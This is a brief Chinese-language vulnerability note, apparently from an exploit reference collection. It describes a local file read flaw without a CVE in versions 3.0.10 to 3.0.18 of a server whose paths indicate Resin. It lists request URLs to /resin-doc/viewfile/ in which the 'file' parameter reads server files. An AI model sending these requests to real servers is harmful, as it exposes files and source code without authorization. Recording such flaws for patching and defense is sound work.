##cve编号：无
##漏洞名称：本地文件读取
##漏洞类型：本地文件读取
##影响版本：
- 3.0.10-3.0.18
- 3.0.19不受影响
##利用脚本：
##漏洞细节：
- 访问/resin-doc/viewfile/?contextpath=/&servletpath=&file=fakefile.xml
- resin-doc/viewfile/?file=index.jsp
- 参数file可读取文件
##reference：
